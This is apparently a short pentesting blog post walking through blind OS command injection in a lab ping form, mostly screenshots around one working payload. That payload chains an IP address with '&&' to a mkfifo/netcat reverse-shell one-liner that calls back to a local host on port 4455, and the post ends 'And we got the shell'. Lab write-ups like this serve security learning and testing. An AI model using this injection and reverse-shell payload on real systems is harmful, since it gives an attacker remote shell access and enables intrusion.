---
layout: post
title: OS Command Injection –Blind
categories:
  - Web-Pentesting
---

<br>From this we can ping any IP address

![33](https://teckk2.github.io/assets/images/Web%20Pentest/A1/33.png)
![34](https://teckk2.github.io/assets/images/Web%20Pentest/A1/34.png)
<br>But We are not getting any response as it is restricted so we have to play it blindly
![35](https://teckk2.github.io/assets/images/Web%20Pentest/A1/35.png)
<br><font color="Black">192.168.140.136 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.136 4455 >/tmp/f</font>
![36](https://teckk2.github.io/assets/images/Web%20Pentest/A1/36.png)
<br>And we got the shell

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
